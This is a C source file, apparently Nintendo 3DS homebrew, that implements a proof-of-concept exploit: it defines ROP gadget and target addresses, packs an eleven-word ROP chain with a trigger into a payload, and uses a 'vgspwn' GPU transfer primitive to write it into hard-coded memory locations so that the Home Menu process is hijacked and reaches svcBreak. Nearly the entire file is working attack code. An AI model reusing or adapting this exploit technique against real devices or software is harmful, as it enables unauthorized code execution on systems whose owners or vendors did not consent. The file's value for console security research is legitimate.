#include "vgspwn.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Gadgets */

#define LDMIB_R0I__R0_R1_R2_R4_R5_R8_R12_SP_LR_PC 0x10088C

/* Addresses */

#define SVC_BREAK 0x136F28
#define ROP_ENTRY 0x1186B8

#define ROP_CHAIN_PTR_DST 0x32F05C
#define ROP_CHAIN_DST 0x35F1A4
#define ROP_TRIGGER_DST 0x362700

/* Payload */

#define ROP_CHAIN_PTR_OFFSET 0
#define ROP_CHAIN_PTR_SIZE sizeof(u32)

#define ROP_CHAIN_OFFSET ROP_CHAIN_PTR_OFFSET
#define ROP_CHAIN_SIZE (11 * sizeof(u32))

#define ROP_TRIGGER_OFFSET (ROP_CHAIN_OFFSET + ROP_CHAIN_SIZE)
#define ROP_TRIGGER_SIZE sizeof(u32)

static const u32 g_Payload[] = {
	// Chain
	ROP_CHAIN_DST, // Skipped
	0xCAFEBABE, // R0
	0x41414141, // R1
	LDMIB_R0I__R0_R1_R2_R4_R5_R8_R12_SP_LR_PC, // R2 (required by entry)
	0xDEADC0DE, // R4
	0x69696969, // R5
	0x13371337, // R8
	0xF00DCAFE, // R12
	0xDEADBEEF, // SP
	0x75107510, // LR
	SVC_BREAK, // PC (svcBreak)

	// Trigger
	ROP_ENTRY,
};

int main(int argc, char* argv[]) {
	gfxInit(GSP_BGR8_OES, GSP_BGR8_OES, false);
	consoleInit(GFX_TOP, NULL);
	vgspwnInit();

	// Setup Buffers.
	// Could probably reuse shared GSP memory to avoid VRAM shenanigans.
	void* linearBuffer = linearAlloc(sizeof(g_Payload));
	if (!linearBuffer) {
		printf("Linear buffer allocation failed!\n");
		goto end;
	}

	void* vramBuffer = vramAlloc(sizeof(g_Payload));
	if (!vramBuffer) {
		printf("VRAM buffer allocation failed!\n");
		goto end;
	}

	memcpy(linearBuffer, g_Payload, sizeof(g_Payload));
	GSPGPU_FlushDataCache(linearBuffer, sizeof(g_Payload));

	GX_TextureCopy((u32*)linearBuffer, 0, (u32*)vramBuffer, 0, sizeof(g_Payload), 0x8);
	gspWaitForPPF();

	GSPGPU_InvalidateDataCache(vramBuffer, sizeof(g_Payload));

	linearFree(linearBuffer);

	// Do thing.

	vgspwnSelect(0);
	vgspwnAddTransfer((u32)vramBuffer + ROP_CHAIN_PTR_OFFSET, ROP_CHAIN_PTR_DST, ROP_CHAIN_PTR_SIZE);
	vgspwnAddTransfer((u32)vramBuffer + ROP_CHAIN_OFFSET, ROP_CHAIN_DST, ROP_CHAIN_SIZE);
	vgspwnAddTransfer((u32)vramBuffer + ROP_TRIGGER_OFFSET, ROP_TRIGGER_DST, ROP_TRIGGER_SIZE);
	vgspwnCommit();

	// Home menu should break before we get here...

	vramFree(vramBuffer);
	printf("Pwn failed! Please retry.\n");

end:
	while (aptMainLoop()) {
		gspWaitForVBlank();
		gfxFlushBuffers();
		hidScanInput();

		if (hidKeysDown() & KEY_START)
			break;
	}

	vgspwnExit();
	gfxExit();
	return 0;
}